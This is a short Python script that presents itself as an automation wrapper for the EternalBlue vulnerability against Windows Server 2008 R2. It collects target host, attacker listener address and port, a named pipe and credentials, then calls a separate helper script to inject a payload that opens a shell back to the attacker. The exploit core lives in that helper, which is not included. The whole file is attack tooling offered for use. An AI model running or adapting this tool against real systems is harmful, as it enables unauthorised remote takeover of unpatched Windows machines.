import sys
import urllib
from os import system, name
import os.path


def pwn(rhost, namedpipes, lhost, lport, USERNAME, PASSWORD):
       #passing the arguments to the script that allows us to inject and execute the payload
       os.system("python automation-dependency-simpleshell.py %s %s %s %s %s %s"%(rhost,namedpipes,USERNAME,PASSWORD,lhost,lport))
print("""This an automation script for the eternalblue vulnerability
         [*]Tested on windows server 2008 R2
         run the script as root ;)""")
#getting the necessary arguments to generate and inject the payload
print("First I need you to fill some parameters")
lhost = raw_input("Enter LHOST: ")
namedpipes = raw_input("enter a namedpipe, maybe take a look at my namedpipes.txt gift for you ;) :")
lport = raw_input("Enter LPORT: ")
rhost = raw_input("Enter RHOST: ")
USERNAME = raw_input("enter a valid username:")
PASSWORD = raw_input("enter a valid password:")
pwn(rhost, namedpipes,lhost, lport, USERNAME, PASSWORD)
